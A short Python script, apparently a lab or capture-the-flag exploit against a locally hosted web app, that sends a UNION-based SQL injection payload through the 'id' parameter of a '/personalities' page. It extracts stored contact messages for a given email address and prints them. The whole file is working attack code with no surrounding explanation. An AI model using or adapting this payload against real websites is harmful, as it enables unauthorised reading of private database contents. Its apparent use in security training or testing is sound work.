import sys
import requests
from bs4 import BeautifulSoup


# Set parameters
ip = "172.17.0.2" if len(sys.argv) > 1 else "127.0.0.1"
url = "http://" + ip + "/personalities"
email = "james@bond.mi5"

# Prepare payload for the GET request
data = {'id': "1' union select message, message from contact_messages where mail='" + email + "' -- "}

# Make the request
r = requests.get(url, data)

# Parse the received html and extract the desired message
soup = BeautifulSoup(r.text, 'html.parser')
print(soup.findAll('a', {'class': 'list-group-item'})[1].text.split(':')[0])
